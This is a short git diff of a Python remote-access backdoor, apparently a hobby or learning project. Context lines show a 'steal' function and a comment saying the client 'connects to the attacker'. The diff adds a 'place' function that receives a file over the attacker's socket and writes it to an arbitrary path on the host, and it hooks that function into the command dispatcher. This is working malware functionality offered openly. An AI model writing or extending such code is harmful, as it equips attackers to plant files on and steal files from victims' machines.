@@ -18,6 +18,27 @@ def steal(sock, path):
 	except:
 		pass
 
+def place(sock, path):
+	path = path.split(" ")[1]
+	end = "end".encode()
+
+	file = open(path, "wb")
+
+	print("made", path)
+
+	f = sock.recv(1024)
+	print(f)
+	
+	while f != end:
+		
+		file.write(f)
+		f = sock.recv(1024)
+
+	file.close()	
+	
+	
+
+
 
 # connects to the attacker
 # returns a socket
@@ -75,7 +96,7 @@ def main():
 			steal(sock, parameter)
 			pass
 		elif action == "place":
-			# TODO: recieve a file form listener and save it
+			place(sock, parameter)
 			pass
 		else:
 			sock.send(b"Invalid command")
